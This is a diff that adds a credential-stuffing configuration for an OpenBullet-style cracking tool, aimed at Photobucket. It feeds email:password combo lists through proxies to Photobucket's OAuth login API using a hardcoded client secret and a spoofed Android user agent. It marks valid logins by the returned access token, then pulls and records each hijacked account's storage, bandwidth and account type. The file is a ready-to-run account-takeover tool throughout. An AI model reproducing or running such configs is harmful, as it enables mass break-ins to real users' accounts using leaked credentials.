@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "Photobucket",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-20T19:05:58.5223194+00:00",
+  "AdditionalInfo": "",
+  "Author": "Relent",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<PASS>" -> VAR "newpass" 
+FUNCTION URLEncode "<USER>" -> VAR "newuser" 
+REQUEST POST "https://api.photobucket.com/v2/oauth/token" 
+  CONTENT "username=<newuser>&client_secret=139dd10d2653c83e20e8ae906856d709&client_id=149833852&uniqueDeviceId=561af211-5838-4a98-9f31-671808744cf2&grant_type=password&password=<newpass>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; LGM-V300K Build/N2G47H)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "client_id: 149833852" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Host: api.photobucket.com" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"Username or password is incorrect\"" 
+  KEYCHAIN Success OR 
+    KEY "\"access_token\"" 
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "token" 
+PARSE "<SOURCE>" LR "\"username\":\"" "\"" -> VAR "name" 
+REQUEST GET "https://api-den2.photobucket.com/v2/users/<name>?a=account,affinity" 
+  
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; LGM-V300K Build/N2G47H)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "client_id: 149833852" 
+  HEADER "Host: api-den2.photobucket.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"accountType\":0," 
+PARSE "<SOURCE>" LR "\"curStorage\":" "," -> VAR "cap1" 
+PARSE "<SOURCE>" LR "\"maxStorage\":" "," -> VAR "cap2" 
+PARSE "<SOURCE>" LR "\"curBandwidth\":" "," -> VAR "cap4" 
+PARSE "<SOURCE>" LR "\"maxBandwidth\":" "," -> VAR "cap3" 
+FUNCTION Compute "<cap1>/1000000000" -> VAR "capture1" 
+FUNCTION Compute "<cap2>/1000000000" -> VAR "capture2" 
+FUNCTION Compute "<cap3>/1000000000" -> VAR "capture3" 
+FUNCTION Compute "<cap4>/1000000000" -> VAR "capture4" 
+PARSE "<capture1>" LR "" "" -> CAP "Current Storage Used" "" " GB" 
+PARSE "<capture2>" LR "" "" -> CAP "Max Storage" "" " GB" 
+PARSE "<capture4>" LR "" "" -> CAP "Current Bandwidth Used" "" " GB" 
+PARSE "<capture3>" LR "" "" -> CAP "Max Bandwidth" "" " GB" 
+PARSE "<SOURCE>" LR "\"resetBandwidth\":\"" "T" -> CAP "Bandwidth Reset" 
